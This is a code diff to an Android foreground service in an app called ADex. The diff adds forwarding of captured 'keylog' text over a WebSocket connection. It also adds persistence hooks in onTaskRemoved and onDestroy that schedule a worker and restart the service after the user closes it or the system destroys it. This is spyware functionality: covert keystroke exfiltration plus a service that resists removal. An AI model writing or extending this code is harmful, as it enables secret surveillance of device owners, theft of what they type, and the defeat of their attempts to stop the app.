@@ -13,6 +13,7 @@ import androidx.core.app.NotificationCompat
 import com.adex.app.MainActivity
 import com.adex.app.R
 import com.adex.app.data.SettingsStore
+import com.adex.app.util.PersistenceWorker
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -58,7 +59,14 @@ class ADexForegroundService : Service(), WebSocketEvents {
             ServiceActions.ACTION_PACKAGE_EVENT -> {
                 val eventType = intent.getStringExtra(ServiceActions.EXTRA_EVENT_TYPE) ?: "unknown"
                 val packageName = intent.getStringExtra(ServiceActions.EXTRA_PACKAGE_NAME) ?: "unknown"
-                webSocketManager.sendEvent(eventType, mapOf("packageName" to packageName, "timestamp" to System.currentTimeMillis()))
+                val payload = mutableMapOf<String, Any>(
+                    "packageName" to packageName,
+                    "timestamp" to System.currentTimeMillis()
+                )
+                if (eventType == "keylog") {
+                    payload["text"] = intent.getStringExtra("text") ?: ""
+                }
+                webSocketManager.sendEvent(eventType, payload)
             }
         }
 
@@ -204,9 +212,21 @@ class ADexForegroundService : Service(), WebSocketEvents {
         sendBroadcast(intent)
     }
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        PersistenceWorker.schedule(applicationContext)
+        val restartIntent = Intent(applicationContext, ADexForegroundService::class.java).apply {
+            action = ServiceActions.ACTION_START
+        }
+        runCatching {
+            ContextCompat.startForegroundService(applicationContext, restartIntent)
+        }
+    }
+
     override fun onDestroy() {
         started = false
         isServiceRunning = false
+        PersistenceWorker.schedule(applicationContext)
         commandDispatcher.shutdown()
         webSocketManager.disconnect()
         serviceScope.cancel()
